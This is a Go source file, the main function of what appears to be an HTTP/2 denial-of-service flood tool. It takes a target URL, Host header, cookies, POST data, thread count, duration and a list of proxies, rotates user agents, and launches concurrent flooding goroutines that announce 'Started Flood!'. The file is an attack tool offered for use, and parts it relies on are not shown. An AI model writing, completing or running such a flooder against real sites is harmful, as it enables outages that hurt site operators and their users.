package main

import (
	"fmt"
	//"io/ioutil"
	"math/rand"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var UserAgents = make(map[int]string)
var LoadedProxies = make(map[int]string)
var RsIP int
var ThreadSync sync.WaitGroup

var Sys System


func InitializeUserAgents() {
	for y, x := range Agents {
		UserAgents[y] = x
	}
}

func main() {
	InitializeUserAgents()
	rand.Seed(time.Now().UnixNano())
	ShareBanner := Parser()
	if len(os.Args) < 8 {
		fmt.Println(len(os.Args))
		fmt.Println(ShareBanner)
		return
	}

	var HTTPVersion string
	var Host string
	var HTTP_HOST string
	var limit int
	var Good string
	var threads int
	var mode string
	var dur int
	var cookie interface{}
	var adduseragent interface{}
	var data interface{}
	fmt.Sprint(HTTPVersion)

	Arguments := os.Args[1:]
	for _, x := range Arguments {
			   if strings.Contains(x, "version=") {
			HTTPVersion = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "host=") {
			Host = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "domain=") {
			HTTP_HOST = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "time=") {
			dur, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "limit=") {
			limit, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "threads=") {
			threads, _ = strconv.Atoi(strings.Split(x, "=")[1])
		} else if strings.Contains(x, "mode=") {
			mode = strings.Split(x, "=")[1]
		} else if strings.Contains(x, "cookie=") {
			cookie = strings.Split(x, "cookie=")[1]
		} else if strings.Contains(x, "adduseragent=") {
			adduseragent = strings.Split(x, "adduseragent=")[1]
		} else if strings.Contains(x, "data=") {
			data = strings.Split(x, "data=")[1]
		} else if strings.Contains(x, "good=") {
			Good = strings.Split(x, "=")[1]
		} else {
			if !strings.Contains(x, "cookie=") {
				cookie = nil
			} else if !strings.Contains(x, "data=") {
				data = nil
			} else if !strings.Contains(x, "getpost=") {
				mode = "GET"
			}
			fmt.Println(ShareBanner)
		}
	}
	//fmt.Println(Good)
	
	parsed := Good
	prox := strings.Split(parsed, "\n")
	for i, p := range prox {
		LoadedProxies[i] = p
	}	

	New := Attack{
		Url: Host,
		Host: HTTP_HOST,
		AttackMethod: mode,
		PostData: data,
		RequestsPerIP: limit,
		Cookie: cookie,
		Jokeragent: adduseragent,
	}
	Sys = System{
		Banner: ShareBanner,
		HTTP2Timeout: 10000,
		Attack: &New,
	}

	for x := 0; x < threads; x++ {
		go HTTP2(&ThreadSync)
		ThreadSync.Add(1)
	}
	ThreadSync.Wait()
	close(start)
	fmt.Println("Started Flood!")
	time.Sleep(time.Duration(dur)*time.Second)
}